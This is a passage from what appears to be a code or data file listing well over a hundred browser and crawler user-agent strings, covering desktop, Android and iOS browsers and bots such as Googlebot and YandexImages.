      "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0 r3dfox/131.0.3",
      "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20010101 Firefox/131.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/130",
      "raynette_httprequest/1.0",
      "Mozilla/5.0 (Linux; Android 7.0; FS8025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; SH-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 7.0; 15 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 YaApp_Android/20.124.0 YaSearchBrowser/20.124.0 BroPP/1.0 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS) (compatible; Googlebot-Mobile/2.1; http://www.google.com/bot.html)",
      "HTTPClient/1.0 (2.8.3, ruby 2.7.6)",
      "Mozilla/5.0 (Linux; Android 7.0; FS8025) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; SH-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; 2E E450 2018 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36",
      "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)",
      "Mozilla/5.0 (Linux; Android 7.0; FS8025 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 7.0; 15 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 YaBrowser/20.3.4.108.00 SA/1 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.0.0 Mobile DuckDuckGo/125 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.167 Mobile DuckDuckGo/120 Safari/537.36",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12",
      "Mozilla/5.0 (Linux; Android 8.1.0; 2E E450 2018 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.126 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5",
      "Mozilla/5.0 (Linux; arm_64; Android 7.0; 15 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 YaApp_Android/21.21.0 YaSearchBrowser/21.21.0 BroPP/1.0 SA/3 Mobile Safari/537.36",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9",
		"Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12",
		"Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0",
		"Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15",
      "Mozilla/5.0 (Linux; arm_64; Android 7.0; 15 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 YaBrowser/19.7.7.115.00 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 14; A202SH Build/SA180; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.122 Mobile Safari/537.36 YJApp-ANDROID jp.co.yahoo.android.ybrowser/3.58.0.0",
      "Mozilla/5.0 (Linux; Android 11; Infinix X689C Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 coc_coc_browser/132.0.0",
      "Mozilla/5.0 (compatible; Abonti/0.91 - http://www.abonti.com)",
      "Mozilla/5.0 (Linux; Android 9; SH-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 11; NX629J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 11.0; Mobiistar_LAI_Zumbo_J_2017 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.2704.81 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 7.0; arm_64; 15 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 YaBrowser/20.7.3.99.00 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 9; 16s Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.166 YaBrowser/21.8.2.129.00 SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; NX629J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; arm_64; Android 9; 16s Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 YaBrowser/19.12.1.121.00 Mobile Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.8 (KHTML, like Gecko; Google Web Preview) Chrome/19.0.1084.36 Safari/536.8",
      "Mozilla/5.0 (X11; Linux x86_64 like Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.56 Safari/537.36 OPR/117.0.5405.0 (Applebot/0.1; +http://www.apple.com/go/applebot)",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6809.71 Safari/537.36 OPR/114.0.5137.71",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6645.99 Safari/537.36 OPR/114.0.4713.18",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0",
      "Mozilla/5.0 (Linux; Android 8.1.0; Moto G (4)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36 PTST/240613.172707 [ip:34.23.61.45]",
      "Mozilla/5.0 (Linux; Android 6.0; Turbo_X5_Black Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 YaBrowser/15.4.2272.3842.00 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 6.0; LG-H650 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.6088.00 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 12; RKY-AN10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 6.0; SM-J106B Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 YaBrowser/15.6.2311.6088.00 Mobile Safari/E7FBAF",
      "Mozilla/5.0 (Linux; Android 12; XT2175-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 12; B1550VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.153 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; TECNO KC1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; TECNO CC9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; TECNO AB7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 9; NX629J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3",
      "Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36 PetalSearch/11.0.2.305",
      "Mozilla/5.0 (Linux; U; Android 14; zh-tw; Xiaomi 13 Ultra Build/UKQ1.230804.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/14.6.0-gn",
      "Mozilla/5.0(iPad;CPUOS13_6likeMacOSX)AppleWebKit/605.1.15(KHTML,likeGecko)Version/13.1.2Mobile/15E148Safari/604.1",
      "Mozilla/5.0 (iPhone 15; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Linux; U; Android 9; zh-cn; unknown Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/20.5.0.9",
      "Mozilla/5.0 (Linux; Android 9; SM-T530N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.3764.141 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 12; ADY-AL00 Build/HUAWEIADY-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 12; CET-AL00 Build/HUAWEICET-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; REA-AN00 Build/HONORREA-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 7.1.1; NX595J Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; V2266A Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; V2307A Build/UP1A.231005.007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; PEDM00 Build/UKQ1.230924.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; LGE-AN00 Build/HONORLGE-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; ELZ-AN00 Build/HONORELZ-AN00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 14; 2311DRK48C Build/UP1A.230905.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 13; V1955A Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 13; V2148A Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo K10a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 13; V2190A Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 PTST/240912.163008",
      "Mozilla/5.0 (Linux; arm_64; Android 10; NOTE 20 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.160 YaBrowser/22.5.6.36.00 (beta) SA/3 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; 11; KINGKONG 5 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15",
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 YaBrowser/13.10.1500.9323 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASJB; rv:11.0) like Gecko",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (Linux; Android 9; NX629J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 1stBrowser/45.0.2454.171 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 1stBrowser/45.0.2454.160 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20",
      "Mozilla/5.0 (Windows; U; Win 9x 4.90; rv:1.7) Gecko/20040803 Firefox/0.9.3",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 PTST/250113.145121",
      "Mozilla/5.0 (Linux; Android 9; NX629J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 10; zh-cn; GM1910 Build/QKQ1.190716.003) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 HeyTapBrowser/40.7.24.1",
      "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1.19) Gecko/20081217 KMLite/1.1.2",
      "Mozilla/5.0 (Linux; U; Android 8.0; LLD-AL20 Build/HUAWEILLD-AL20OPR6.170623.021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A916 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 YaBrowser/19.6.0.179 (lite) Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A916 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 140.0.0.30.126 Android (19/4.4.2; 320dpi; 720x1280; Lenovo; Lenovo A916; A916; mt6592; ru_RU; 212676875)",
      "Mozilla/5.0 (Web0S 100.0; Linux/SmartTV) (compatible; Google Desktop/6.0; http://desktop.google.com/)",
      "Mozilla/5.0 (compatible; Google Desktop/5.9.909.2235; http://desktop.google.com/)",
      "Mozilla/5.0 (compatible; Google Desktop/5.9.911.3589; http://desktop.google.com/)",
      "Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo K10a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.9.1155 Mobile Safari/537.36",
      "Mozilla/5.0 (compatible; Google Desktop/5.9.1005.12335; http://desktop.google.com/)",
      "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile DuckDuckGo/1 Lilo/1.2.3 Safari/537.36",
      "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/133.0.6943.53 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile DuckDuckGo/5 Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 7.1.2; zh-CN; MZ-15 Lite Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 MZBrowser/7.4.110-2018101016 UWS/2.15.0.2 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-N920C Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; U; Android 8.0.0; en-US; LLD-AL10 Build/HONORLLD-AL10) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.9.1155 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; 2E E450 2018 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.1.0; 2E E450 2018 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.4.2; Matrix7116 Build/706K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG SM-J250M Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J120M Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87 Mobile Safari/537.36",
      "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
      "Mozilla/5.0 (X11; CrOS x86_64 6946.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0",
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
      "Mozilla/5.0 (Linux; Android 11; vivo 1906) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; ASUS_I005DA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36 EdgA/100.0.1185.50",
		"Mozilla/5.0 (Linux; Android 12; I2126) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; KB2005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; LE2121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36",
		"Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.98 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.0.0; SM-T813) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 11; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; SM-J330F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 8.0.0; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 11; SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
      "Mozilla/5.0 (iPod touch; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 IceDragon/38.0.5 Firefox/38.0.5",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; managedpc; rv:11.0) like Gecko",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 10; SM-A315G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Mobile Safari/537.36",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko",
      "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:37.0) Gecko/20100101 Firefox/37.0",
      "Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; Lumia 1520) like Gecko",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0",
      "Mozilla/5.0 (Linux; Android 4.4.4; Z970 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
      "Mozilla/5.0 (X11; CrOS armv7l 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
      "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/6.0)",
      "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
      "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; MS-RTC LM 8)",
      "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
